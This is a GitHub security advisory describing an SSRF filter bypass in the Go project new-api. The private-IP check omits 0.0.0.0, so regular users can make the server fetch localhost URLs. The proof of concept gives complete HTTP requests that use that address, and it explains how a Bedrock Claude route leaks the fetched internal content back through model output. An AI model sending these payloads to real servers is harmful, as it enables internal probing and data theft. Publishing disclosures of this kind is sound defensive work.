# [H] QuantumNous/new-api has an SSRF Filter Bypass via 0.0.0.0

## Summary
Severity: High
Advisory: GHSA-v5c3-6wvc-pc2q
CVE: CVE-2026-42339
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-v5c3-6wvc-pc2q
Type: github-advisory

## Affected
- Go: `github.com/QuantumNous/new-api` — affected >=0

## Details
# SSRF Filter Bypass via `0.0.0.0` 

### Summary

The SSRF protection introduced in v0.9.0.5 (CVE-2025-59146) and hardened in v0.9.6 (CVE-2025-62155) does not block the unspecified address `0.0.0.0`. A regular (non-admin) user holding any valid API token can send a multimodal request to `/v1/chat/completions`, `/v1/responses`, or `/v1/messages` with `0.0.0.0` as the image/file URL host, bypassing the private-IP filter and causing the server to issue HTTP requests to localhost. This constitutes at minimum a **blind SSRF**; when the request is routed through an AWS/Bedrock Claude adaptor, the fetched content is inlined into the model response, upgrading it to a **full-read SSRF**.

### Details

#### Root Cause

`common/ssrf_protection.go` — `isPrivateIP()` (lines 33–47) checks the following ranges:

- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`
- `127.0.0.0/8`
- `169.254.0.0/16`
- `224.0.0.0/4`
- `240.0.0.0/4`

**`0.0.0.0/8` is not checked.** On Linux, `0.0.0.0` resolves to the local machine, same as `127.0.0.1`.

#### Default Fetch Settings

`setting/system_setting/fetch_setting.go` (lines 16–24) defaults:

- `EnableSSRFProtection: true`
- `AllowPrivateIp: false`
- `AllowedPorts: ["80", "443", "8080", "8443"]`
- `ApplyIPFilterForDomain: true`

So `0.0.0.0` on any of these four ports passes all checks.

#### Data Flow (primary chain — `/v1/chat/completions`)

```
User API token
→ /v1/chat/completions  (TokenAuth, no admin required)
→ messages[].content[].image_url.url = "http://0.0.0.0:8080/..."
→ dto/openai_request.go:111-117   createFileSource() recognises http(s):// as URL source
→ dto/openai_request.go:119-198   GetTokenCountMeta() collects image_url.url / file.file_data / video_url
→ service/token_counter.go:237-264 LoadFileSource() fetches URL when shouldFetchFiles == true
→ service/file_service.go:135-143  loadFromURL() → DoDownloadRequest()
→ service/download.go:52-68       ValidateURLWithFetchSetting() → 0.0.0.0 NOT blocked → GetHttpClient().Get()
→ Server issues real TCP connection to 0.0.0.0
```

**Note on stream requirement:** `common/init.go` (lines 140–141) defaults `GET_MEDIA_TOKEN=true` but `GET_MEDIA_TOKEN_NOT_STREAM=false`, so `stream: true` is needed to trigger the fetch path.

#### Additional Affected Endpoints

The same `ValidateURLWithFetchSetting()` → `DoDownloadRequest()` sink is reachable from:

| Endpoint | User-controlled field | Auth required |
|---|---|---|
| `/v1/chat/completions` | `image_url.url`, `file.file_data`, `video_url` | Regular user token |
| `/v1/responses` | `input_file.file_url`, `input_image.image_url` | Regular user token |
| `/v1/messages` | `source.url` (type: `"url"`) | Regular user token |
| `/api/user/setting` | `webhook_url`, `bark_url`, `gotify_url` | Regular user (self) |

#### Upgrade to Full-Read SSRF (conditional)

`relay/channel/aws/adaptor.go` (lines 41–61) — `ConvertClaudeRequest()`:

- If the request is routed to an AWS/Bedrock Claude channel, the adaptor iterates over message content
- When `source.type == "url"`, it calls `service.GetBase64Data()` which invokes the same `DoDownloadRequest()` path
- The fetched content is rewritten to `type: "base64"` and inlined into the model request
- The model then describes/transcribes the content in its response

This means an attacker can read the actual content of internal resources (images, PDFs, text) through the model's output, not just detect open/closed ports.

### Proof of Concept

**Prerequisites:** A regular user account with a valid API token. No admin privileges required.

**Step 1 — Control group: `127.0.0.1` is blocked**

```http
POST /v1/chat/completions HTTP/1.1
Host: <redacted>
Authorization: Bearer sk-<user-token>
Content-Type: application/json

{
  "model": "gpt-4o-mini",
  "stream": true,
  "max_tokens": 1,
  "messages": [
    {
      "role": "user",
      "content": [
        {"type": "text", "text": "describe"},
        {
          "type": "image_url",
          "image_url": {
            "url": "http://127.0.0.1:8080/probe.png",
            "detail": "low"
          }
        }
      ]
    }
  ]
}
```

Response:

```
private IP address not allowed: 127.0.0.1
```

**Step 2 — Experiment group: `0.0.0.0` bypasses the filter**

```http
POST /v1/chat/completions HTTP/1.1
Host: <redacted>
Authorization: Bearer sk-<user-token>
Content-Type: application/json

{
  "model": "gpt-4o-mini",
  "stream": true,
  "max_tokens": 1,
  "messages": [
    {
      "role": "user",
      "content": [
        {"type": "text", "text": "describe"},
        {
          "type": "image_url",
          "image_url": {
            "url": "http://0.0.0.0:8080/probe.png",
            "detail": "low"
          }
        }
      ]
    }
  ]
}
```

Response:

```
dial tcp 0.0.0.0:8080: connect: connection refused
```

The server attempted a real TCP connection — the SSRF filter was bypassed.

**Step 3 — Confirm readback capability via multimodal model**

```http
POST /v1/chat/completions HTTP/1.1
Host: <redacted>
Authorization: Bearer sk-<user-token>
Content-Type: application/json

{
  "model": "claude-3-5-sonnet-latest",
  "stream": false,
  "max_tokens": 32,
  "messages": [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "Transcribe exactly the text in the image. Output only the text."
        },
        {
          "type": "image_url",
          "image_url": {
            "url": "https://dummyimage.com/600x180/111/fff.png&text=READBACK-OK-314159",
            "detail": "low"
          }
        }
      ]
    }
  ]
}
```

Response:

```json
{"choices":[{"message":{"content":"READBACK-OK-314159"}}]}
```

This confirms that when the fetch target returns readable content (image/PDF/text), the model's response leaks that content to the attacker. Combining Step 2 and Step 3: if an internal service on `0.0.0.0:<allowed-port>` returns image or document content, an attacker can exfiltrate it.

### Impact

An authenticated regular user (no admin privileges) can:

1. **Probe localhost and internal services** — Determine open/closed ports on the server by observing `connection refused` vs timeout vs HTTP-level errors. Default allowed ports are 80, 443, 8080, and 8443.
2. **Exfiltrate internal content** — When the request routes through a multimodal model (especially AWS/Bedrock Claude), the server fetches the resource and the model returns its content (OCR for images, summarization for PDFs/text).
3. **Bypass all previous SSRF mitigations** — This is a direct bypass of the `isPrivateIP()` check. No redirect chain, no DNS rebinding, no race condition required — just replacing `127.0.0.1` with `0.0.0.0`.

Since user registration is often enabled by default, any registered user can exploit this.

### Suggested Fix

1. Add `0.0.0.0/8` to the deny list in `isPrivateIP()` (`common/ssrf_protection.go`)
2. Audit against the full [[IANA IPv4 Special-Purpose Address Registry](https://www.iana.org/assignments/iana-ipv4-special-registry/)](https://www.iana.org/assignments/iana-ipv4-special-registry/) — also ensure coverage for:
   - `0.0.0.0/8` ("This network")
   - `100.64.0.0/10` (Carrier-grade NAT)
   - `198.18.0.0/15` (Benchmarking)
   - IPv6 equivalents: `::1`, `::`, `[::]`, `fe80::/10`
3. Apply the same IP validation to post-redirect targets (already partially addressed in `service/http_client.go:24-33`, but does not help when the initial address itself bypasses the filter)

### Resources

- **CVE-2025-59146** (GHSA-xxv6-m6fx-vfhh): Original authenticated SSRF, patched in v0.9.0.5
- **CVE-2025-62155** (GHSA-9f46-w24h-69w4): 302 redirect bypass of the SSRF fix, patched in v0.9.6

## References
- https://github.com/QuantumNous/new-api/security/advisories/GHSA-v5c3-6wvc-pc2q
- https://nvd.nist.gov/vuln/detail/CVE-2026-42339
- https://github.com/QuantumNous/new-api
- https://github.com/advisories/GHSA-9f46-w24h-69w4
